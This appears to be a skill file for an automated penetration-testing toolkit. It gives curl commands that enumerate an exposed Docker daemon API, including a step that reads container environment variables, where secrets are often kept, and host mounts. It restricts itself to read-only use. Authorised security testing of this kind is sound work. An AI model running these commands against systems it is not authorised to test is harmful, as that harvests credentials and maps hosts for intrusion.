---
name: docker-api
description: Docker daemon API exposure and container enumeration
version: 1.0.0
phase: enum
category: infrastructure
tags: [docker, containers, api]
tools: [curl]
difficulty: basic
opsec_level: medium
time_estimate: 30s
severity_if_found: critical
related_skills:
  - kubernetes-api
  - cloud-storage
mitre_attack:
  - T1610
  - T1613
---

## When to Use

Use this skill when you suspect a Docker daemon is exposed on the network
(default port 2375/2376) without TLS or authentication.

## Prerequisites

- curl

## Procedure

```bash
# Step 1: Check if Docker API is accessible
curl -sk https://TARGET:2375/version
curl -sk http://TARGET:2375/version

# Step 2: List running containers
curl -sk http://TARGET:2375/containers/json | jq '.[].Names'

# Step 3: List all containers (including stopped)
curl -sk "http://TARGET:2375/containers/json?all=true" | jq '.[].Names'

# Step 4: Enumerate images
curl -sk http://TARGET:2375/images/json | jq '.[].RepoTags'

# Step 5: Get container details (ID from step 2)
CONTAINER_ID=$(curl -sk http://TARGET:2375/containers/json | jq -r '.[0].Id')
curl -sk http://TARGET:2375/containers/$CONTAINER_ID/json | jq '.Config.Env'

# Step 6: Check for host mounts
curl -sk http://TARGET:2375/containers/$CONTAINER_ID/json | jq '.Mounts'

# Step 7: List networks
curl -sk http://TARGET:2375/networks | jq '.[].Name'

# Step 8: List volumes
curl -sk http://TARGET:2375/volumes | jq '.Volumes[].Name'
```

## OPSEC Rules

- Do NOT create, stop, or delete containers
- Do NOT pull or push images
- Do NOT exec into running containers
- Read-only enumeration only
- Log all requests for audit trail

## Verification

- Confirm `/version` returns Docker version
- Verify container listing shows real containers
- Check if any containers have host path mounts

## Pitfalls

- Port 2376 uses TLS — check both 2375 and 2376
- Some environments use socket proxy instead of TCP
- Container IDs are truncated in some API versions
- Rootless Docker may restrict access

## Output Format

```
[DOCKER]  Daemon: 2375 — version: 24.0.5
[DOCKER]  Containers: nginx-proxy, postgres-db, redis-cache
[DOCKER]  Images: nginx:1.25, postgres:15, redis:7
[MOUNT]   postgres-db: /var/lib/postgresql/data → /host/data
[CRITICAL] Exposed Docker daemon — full host compromise possible
```
